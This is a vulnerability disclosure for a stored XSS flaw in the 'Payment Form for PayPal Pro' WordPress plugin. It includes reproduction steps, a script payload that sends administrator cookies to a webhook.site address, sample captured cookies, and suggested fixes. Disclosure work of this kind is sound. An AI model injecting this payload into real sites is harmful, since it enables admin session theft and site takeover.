# wordpress-plugin-xss-vuln
Stored Cross-Site Scripting (XSS) in plugin Payment Form for PayPal Pro  

  

## **Description**
A **Stored Cross-Site Scripting (XSS)** vulnerability exists in the **Payment Form for PayPal Pro** plugin for WordPress. This vulnerability allows an attacker to inject arbitrary JavaScript code into the "Form Name" field, which is then stored in the database and executed when an administrator interacts with the form.

## **Proof of Concept (PoC)**

### **Steps to Reproduce:**
1. Navigate to the plugin settings page in WordPress Admin.
2. Create a new form and enter the following payload in the **Form Name** field:
   ```html
   <script>document.location='https://webhook.site/YOUR-UNIQUE-ID?cookie='+document.cookie</script>
   ```
3. Save the form.
4. Click on the **Messages** button for the form.
5. The injected JavaScript will execute, sending the administrator's cookies to the attacker's webhook.

### **Captured Data (Example):**
```
wp-settings-time-1=1736368536; wp-settings-1=mfold%3Do;
wordpress_test_cookie=WP%20Cookie%20check;
PHPSESSID=na7d4lig2go1f0qmgsuldh8ehc;
rand_code=e824626c35b2e1cdf4475555b7cda814
```
These cookies can potentially allow an attacker to hijack an admin session.

## **Impact**
An attacker could exploit this vulnerability to:
- Steal administrator session cookies and hijack their account.
- Modify website content, inject malicious scripts, or deface the site.
- Redirect users to phishing sites or install malware.

## **Mitigation**
To fix this issue, the plugin developer should:
- Sanitize user input using `esc_html()`, `esc_attr()`, or `wp_kses()` before rendering in the admin panel.
- Use `wp_nonce` to prevent CSRF-based XSS attacks.
- Implement proper input validation and output encoding.

## **References**
- [WordPress Plugin Repository](https://wordpress.org/plugins/)  
- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)  

**Reported by:** Doan Dinh Van
**Affiliation: Fore-Z co.ltd
**Disclosure Date:** 28/03/2025  
